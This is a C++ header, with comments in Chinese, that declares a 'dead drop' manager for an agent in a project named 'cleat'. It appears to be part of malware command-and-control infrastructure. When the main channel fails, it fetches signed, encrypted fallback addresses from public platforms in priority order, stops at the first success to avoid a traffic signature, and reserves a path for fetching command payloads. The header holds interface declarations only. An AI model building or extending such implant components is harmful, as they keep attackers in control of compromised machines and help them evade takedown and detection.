/**
 * @file DeadDropManager.hpp
 * @brief  死投递管理器: 多平台优先级尝试 + seq 单调 + 地址拼接
 * @details
 * 组成: 若干 IDeadDrop(适配器, 优先级序) + DeadDropCrypto(内容层, 统一持有)。
 * TryRecover 流程(任一成功即停, 避免打满全部平台的流量特征):
 *   适配器 FetchRaw → DeadDropCrypto.VerifyAndExtract(HMAC/seq 单调/AEAD)
 *   → 拼完整地址(prefix + suffix) → last_seq_ 推进。
 *
 * 触发: 主通道全灭时由会话层调用(连续 N 次失败), **按需启动非常驻**。
 * 前缀来源: 装配层注入(SetAddressPrefix) —— 运营侧经 SetConfig 下发新 prefix,
 * 或编译期烧录(StaticObfConfig 后续字段), Manager 不关心来源。
 *
 * last_seq 持久化: 当前为**进程内**(成员); 断电丢失 = 退回接受旧内容(无安全损失,
 * seq 单调防重放仍在 —— 旧 seq > 新进程的 0), 持久化接 AgentConfig 域留待集成期。
 */
#pragma once

#include "Core/Exchange/DeadDropCrypto.hpp"
#include "Core/Exchange/IDeadDrop.hpp"

#include <cstdint>
#include <memory>
#include <optional>
#include <string>
#include <vector>

namespace cleat {
namespace deaddrop {

    class DeadDropManager {
    public:
        DeadDropManager() = default;

        /// 注册平台(按调用序 = 优先级序; 先注册先尝试)
        void Register(std::unique_ptr<IDeadDrop> src);

        /// 清空已注册平台(适配器按次现建时用 —— 引用不得跨调用存活)
        void ResetSources() { sources_.clear(); }

        /// 注入主密钥(派生加密/验签子钥; 来源 = SecretVault/烧录, 装配层决定)
        void SetMasterKey(const std::string& masterKey);

        /// 注入地址前缀(备胎地址 = prefix + suffix)
        void SetAddressPrefix(const std::string& prefix);

        /// 恢复最近一次接受的 seq(断电续接; 0 = 首次)
        void SetLastAcceptedSeq(uint64_t seq) { lastSeq_ = seq; }
        uint64_t LastAcceptedSeq() const { return lastSeq_; }

        /**
         * @brief 尝试全部平台恢复备胎地址
         * @param newUrl 成功时输出完整备胎地址(prefix + suffix)
         * @param outSeq 非空时**不内部推进** lastSeq_, 把信封 seq 交还调用方 ——
         *               换址应用(通道链重新密封)失败时不烧信封, 应用成功后调
         *               CommitSeq 落账; 传空 = 维持旧行为
         *               (校验成功即推进, 适用于无外部应用步骤的调用形态)
         * @return true = 某平台给出了**通过全部校验**的新地址; false = 全部失败
         */
        bool TryRecover(std::string& newUrl, uint64_t* outSeq = nullptr);

        /**
         * @brief 落账一个已成功应用的信封 seq(单调; 仅前进)
         * @details 与 TryRecover(outSeq) 配对: 换址应用成功后调用, 此后同 seq/更旧
         *          内容被单调门拒绝。
         */
        void CommitSeq(uint64_t seq);

        /**
         * @brief 尝试全部平台取通用载荷(DD1b —— 活投递下行预留)
         * @return true = 某平台给出了通过全部校验的新载荷(seq 已推进)
         * @details 与 TryRecover 同一调度(优先级序/任一成功即停)与同一单调 seq
         *          空间 —— a/b 两型"谁更新接受谁", 旧内容无论何型一律拒绝。
         *          消费方(低频调度/命令管线)未接线, 当前无生产调用方。
         */
        bool TryFetchPayload(std::string& payload);

        /// 已注册平台数(测试/诊断)
        size_t PlatformCount() const { return sources_.size(); }

    private:
        struct Entry {
            std::unique_ptr<IDeadDrop> src;
        };
        std::vector<Entry> sources_;
        // optional 而非占位密钥实例: masterKey 未注入前**无任何密钥材料驻留**
        // 
        std::optional<DeadDropCrypto> crypto_;
        std::string prefix_;
        uint64_t lastSeq_ = 0;
    };

} // namespace deaddrop
} // namespace cleat
